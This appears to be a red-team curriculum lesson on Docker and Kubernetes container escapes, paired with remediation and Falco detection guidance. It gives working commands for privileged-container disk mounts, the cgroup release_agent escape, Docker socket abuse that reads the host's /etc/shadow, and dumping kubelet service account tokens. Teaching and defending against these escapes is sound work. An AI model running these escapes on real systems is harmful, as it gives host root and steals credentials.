---
title: "Container Escape Lab — Privileged Containers, Socket Mounts, and Namespace Escapes"
tags: [red-team, cloud, container, Docker, escape, privileged, socket, namespace,
  cgroups, seccomp, ATT&CK, T1611, T1552.007, T1610]
module: 08-RedTeam-03
day: 528
related_topics:
  - Kubernetes Security (Day 527)
  - Cross-Environment Attack Paths (Day 529)
  - Linux Privilege Escalation (curriculum reference)
---

# Day 528 — Container Escape Lab

> "A container is not a security boundary. It is a process isolation mechanism.
> If the container runtime has a vulnerability, if the container is privileged,
> if the Docker socket is mounted, if the kernel is old — the container is a
> thin wrapper around a root shell on the host. Every developer who says 'but it
> is containerised' needs to sit with this lesson until they stop saying it."
>
> — Ghost

---

## Goals

Understand the Linux kernel primitives that make container isolation work
(namespaces, cgroups, seccomp, capabilities).
Execute four distinct container escape techniques in a lab environment.
Understand which misconfigurations enable each escape and how to remediate them.
Map each escape to its Falco/Sysmon detection signal.

**Prerequisites:** Day 527 (Kubernetes security), Linux namespace fundamentals,
basic Docker knowledge.
**Time budget:** 5 hours.

---

## Part 1 — Container Isolation Primitives

```
Container isolation relies on Linux kernel features:

  Namespaces: isolate the container's view of system resources
    PID namespace:    container sees only its own processes
    Network namespace: container has its own network stack
    Mount namespace:  container has its own filesystem view
    User namespace:   container can have its own UID 0 (rootless containers)
    UTS namespace:    container has its own hostname
    IPC namespace:    container has its own inter-process communication

  cgroups: limit resource usage (CPU, memory, I/O, PIDs)
    → Prevents DoS from within a container (resource exhaustion)

  Capabilities: fine-grained Linux privileges (vs all-or-nothing root)
    → By default, containers get a reduced capability set
    → CAP_NET_ADMIN: configure network interfaces
    → CAP_SYS_ADMIN: broad system administration (most dangerous)
    → CAP_DAC_OVERRIDE: bypass file permission checks
    → CAP_MKNOD: create device files

  Seccomp: system call filter (whitelist of allowed syscalls)
    → Default Docker seccomp profile blocks ~40 dangerous syscalls

Container escape = breaking one of these isolation layers:
  → If you have CAP_SYS_ADMIN: many kernel exploits become viable
  → If seccomp is disabled: direct kernel exploitation via syscalls
  → If namespaces are shared with the host: the isolation doesn't exist
  → If the Docker socket is accessible from inside: re-configure the runtime
```

---

## Part 2 — Escape 1: Privileged Container

```bash
# Lab setup: a Docker container started with --privileged
# This grants ALL Linux capabilities, disables seccomp, and allows
# direct access to the host's devices

docker run --rm -it --privileged ubuntu:22.04 bash

# Inside the privileged container:
# Verify we have all capabilities:
capsh --print | head -5
# → Current: =ep (every capability)

# Method A: Mount the host disk device
# Find the host's root disk:
fdisk -l
# → /dev/sda1 (or /dev/nvme0n1p1 on NVMe)

# Create a mount point and mount the host root:
mkdir /tmp/hostmount
mount /dev/sda1 /tmp/hostmount

# Read host filesystem:
cat /tmp/hostmount/etc/shadow         # host passwords
cat /tmp/hostmount/root/.ssh/id_rsa   # host SSH private keys
ls /tmp/hostmount/etc/kubernetes/     # K8s config if this is a node

# Method B: Write to host via cgroup notify_on_release escape
# (classic Felix Wilhelm technique, 2019 — works even without a disk to mount)
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Find the cgroup release_agent path on the host:
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# Write the command to execute as root on the HOST:
echo '#!/bin/sh' > /cmd
echo 'id > /tmp/output' >> /cmd   # execute on host; output goes to /tmp/output (host)
chmod +x /cmd

# Trigger the release_agent:
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
# → When the process exits: the cgroup release_agent fires as root on the HOST
# → /tmp/output on the HOST contains the output of id (should show uid=0)

cat /tmp/output   # viewed from INSIDE the container maps to host /tmp/output
# → uid=0(root) gid=0(root) groups=0(root)  (root on the HOST)
```

---

## Part 3 — Escape 2: Docker Socket Mount

```bash
# Lab setup: a container with the Docker socket mounted
# docker run -v /var/run/docker.sock:/var/run/docker.sock ...
# This is used by CI/CD agents, monitoring tools, and development environments

# Inside a container with the Docker socket mounted:
ls -la /var/run/docker.sock
# → srw-rw---- (socket file from the HOST)

# Install the Docker CLI inside the container (or use curl to the socket directly):
apt-get install -y docker.io 2>/dev/null

# Use the HOST'S Docker daemon to launch a privileged escape container:
docker run --rm -it \
    -v /:/host \
    --privileged \
    --pid=host \
    --network=host \
    ubuntu:22.04 \
    chroot /host bash

# → We launched a NEW container via the HOST Docker daemon
# → The new container mounts the HOST root at /
# → chroot /host bash → we are now root on the HOST filesystem
# → This bypasses all restrictions of the original container

# Without a Docker CLI (using curl to the socket):
# List containers via Docker API:
curl --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json

# Create a privileged container via API:
curl --unix-socket /var/run/docker.sock \
    -X POST \
    -H "Content-Type: application/json" \
    http://localhost/v1.41/containers/create \
    -d '{"Image":"ubuntu:22.04","Cmd":["/bin/bash","-c","cat /host/etc/shadow > /tmp/out"],
         "HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
```

---

## Part 4 — Escape 3: Sensitive Host Path Mounts

```bash
# Some containers have sensitive host directories mounted for legitimate reasons:
#   -v /proc:/host/proc
#   -v /sys/fs/cgroup:/sys/fs/cgroup
#   -v /etc/kubernetes:/etc/kubernetes
#   -v /var/lib/kubelet:/var/lib/kubelet

# If /proc is mounted from the host:
# Access the host process tree (PID namespace not isolated):
ls /proc
# → Shows host processes (if --pid=host or /proc is bind-mounted)

# If /etc/kubernetes is mounted:
cat /etc/kubernetes/admin.conf
# → Full cluster-admin kubeconfig for the Kubernetes cluster
export KUBECONFIG=/etc/kubernetes/admin.conf
kubectl get nodes
# → Cluster admin from inside a pod

# If /var/lib/kubelet is mounted:
ls /var/lib/kubelet/pods/
# → SA tokens of ALL pods on this node:
find /var/lib/kubelet/pods/ -name "token" -exec cat {} \; 2>/dev/null
# → Every service account token in every pod on this node
# → Find a privileged SA token; use it to escalate
```

---

## Part 5 — Escape 4: User Namespace + Kernel CVE

```bash
# When the container runs as a non-root user but the kernel has a
# namespace/capability vulnerability, user namespaces can be abused.

# Check kernel version (must be old to have known unpatched CVEs):
uname -r
# → 4.15.0 would be vulnerable to many namespace escape CVEs

# CVE-2022-0492: cgroups v1 release_agent bypass (Linux 5.17.2 and earlier)
# This works from an UNPRIVILEGED container if user namespaces are enabled
# AND the container is not using a seccomp profile or AppArmor

# Check if user namespaces are enabled (kernel parameter):
# From inside a container:
unshare --user id
# → uid=0(root) gid=0(root) — inside a user namespace, you appear as root
# → If combined with CAP_SYS_ADMIN (which user namespaces grant by default):
#   → Many kernel exploits become viable
#   → Exploitation depends on specific kernel version

# Practical check — CVE-2022-0492 PoC:
# (Lab only — requires kernel version before the fix)
# 1. Create a cgroup with user namespace access
# 2. Set release_agent as in Part 2 (Method B) but without --privileged
# 3. The release_agent fires as root on the HOST

# Mitigation: set kernel.unprivileged_userns_clone=0
# (Debian/Ubuntu) — disables user namespace creation by unprivileged users
```

---

## Part 6 — Remediation

| Misconfiguration | Impact | Fix |
|---|---|---|
| `--privileged` container | Full host root | Never use --privileged in production; use specific capabilities (`--cap-add`) instead |
| Docker socket mounted | Full Docker daemon control = host root | Never mount the Docker socket in containers; use a Docker-in-Docker sandbox or Podman rootless |
| hostPath: / mounted | Full host filesystem read/write | Use PersistentVolumes; never mount / or /proc or /etc into a container |
| No seccomp profile | Direct kernel attack surface | Apply the default Docker seccomp profile; or a custom restrictive profile |
| No AppArmor/SELinux | Unrestricted syscall access | Enable AppArmor (Docker/K8s) or SELinux in enforcing mode |
| Old kernel | CVE exploitation from inside container | Keep kernel patched; use a managed K8s offering with auto-upgraded nodes |
| `automountServiceAccountToken: true` (K8s) | SA token accessible to any pod process | Set `automountServiceAccountToken: false` in pod spec if API server access is not needed |

### Kubernetes Security Context Best Practice

```yaml
# Minimal secure pod spec:
apiVersion: v1
kind: Pod
metadata:
  name: secure-app
spec:
  automountServiceAccountToken: false    # no SA token
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 3000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault               # default seccomp
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]                    # drop all capabilities
        add: []                          # add none
    resources:
      limits:
        memory: "128Mi"
        cpu: "500m"
```

---

## Part 7 — Detection

```
Falco rules for container escape:

  Escape 1 (privileged + mount):
    → Falco: "Terminal shell in container" fires when bash spawns
    → Falco: "Create files below /host" fires when writing via hostPath
    → Falco built-in: "Launch privileged container"
      condition: container.privileged = true and spawned_process

  Escape 2 (Docker socket):
    → Falco: "Docker socket opened" — any container opening /var/run/docker.sock
    condition: fd.name = /var/run/docker.sock
    → Alert: container communicating with Docker daemon

  Escape 3 (sensitive mount):
    → Audit pod creation for hostPath volumes with sensitive paths:
      K8s admission controller (OPA/Gatekeeper or Kyverno):
        DENY any pod with hostPath.path matching "/" | "/proc" | "/etc"

  Escape 4 (kernel CVE / namespace escape):
    → Audit trail: unexpected user namespace creation
    → Falco: detect unshare and nsenter syscalls in container context
    condition: syscall.type in (unshare, setns) and container

Kubernetes admission control:
  → Deploy OPA Gatekeeper or Kyverno with policies that DENY:
    - Privileged containers
    - HostPath volumes with root/proc/etc paths
    - Containers without runAsNonRoot
    - Containers without seccomp profile
  → These enforce secure pod specs at creation time — before the escape happens
```

---

## Key Takeaways

1. A privileged container is a container in name only. It has all Linux
   capabilities, no seccomp filtering, and direct device access. Any process
   running in a privileged container can escape to the host in seconds via disk
   mount or cgroup release_agent. Never run production workloads in privileged
   containers.
2. The Docker socket is root. A container with the Docker socket mounted can
   launch new containers as root on the host without any other permissions. CI/CD
   pipelines that mount the Docker socket for building images are giving the build
   process host root access. Use rootless Podman or Kaniko instead.
3. Seccomp and AppArmor profiles are not optional. The default Docker seccomp
   profile blocks the most dangerous syscalls; without it, containers have the
   same kernel attack surface as a root process on the host. Kubernetes applies
   no seccomp by default — set `seccompProfile: RuntimeDefault` in every pod spec.
4. Container security is not container technology security. The attacks in this
   lesson exploit Linux kernel primitives (cgroups, namespaces, capabilities),
   not Docker or Kubernetes vulnerabilities per se. Keeping the kernel patched is
   as important as any container-layer control.
5. Admission control at the K8s API server is the most scalable defence. OPA
   Gatekeeper or Kyverno policies that block privileged pods, hostPath mounts, and
   missing security contexts prevent the misconfigurations that enable every escape
   in this lesson — before the workload ever runs.

---

## Exercises

1. Run `docker run --rm -it --privileged ubuntu:22.04 bash` in your lab.
   Execute the cgroup release_agent escape (Method B from Part 2). Verify the
   output file appears on the HOST filesystem. Explain why this works even though
   you are "inside a container."
2. Run a container with the Docker socket mounted:
   `docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu:22.04 bash`
   Inside, use the Docker API via curl to list running containers. Then launch a
   new container that mounts `/:/host` and reads the host's `/etc/shadow`.
3. Apply the secure pod spec from Part 6 to a lab deployment in kind/minikube.
   Attempt to exec into the pod and run `bash`. What happens? Try to write to the
   filesystem. What error do you get? Verify that `allowPrivilegeEscalation: false`
   prevents `sudo`.
4. Install Falco in your local cluster (using the Helm chart). Trigger the
   "Terminal shell in container" rule by exec-ing into a running pod. Capture the
   Falco output. Write a Falco rule that specifically detects the cgroup
   release_agent escape technique (hint: look for writes to paths matching
   `*/cgroup/*/release_agent`).

---

## Questions

> Add your questions here. Each question gets a Global ID (Q528.1, Q528.2 …).

---

## Navigation

← Previous: [Day 527 — Kubernetes Security](DAY-0527-Kubernetes-Security.md)
→ Next: [Day 529 — Cross-Environment Attack Paths](DAY-0529-Cross-Environment-Attack-Paths.md)
